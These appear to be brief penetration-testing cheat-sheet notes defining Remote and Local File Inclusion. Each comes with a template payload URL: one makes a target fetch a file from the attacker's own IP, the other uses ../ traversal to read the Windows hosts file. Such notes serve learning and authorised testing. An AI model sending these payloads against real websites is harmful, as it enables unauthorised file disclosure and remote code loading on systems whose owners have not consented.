# File inclusion

## <mark style="color:green;">Remote File Inclusion</mark>

Also known as RFI, it is possible for an attacker to load a remote file on the host using protocols like HTTP, FTP etc.

{% code overflow="wrap" lineNumbers="true" %}
```url
http://$url/$query?$value=//$myip/somefile
```
{% endcode %}

***



## <mark style="color:green;">Local File Inclusion</mark>

Also known as LFI, able to get a website to include a file that was not intended to be an option for this application

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/$query?$value=../../../../../../WINDOWS/system32/drivers/etc/hosts #Common file for save host name and ip in windows, we use ../ to get to the root directory C:\
```
{% endcode %}

***



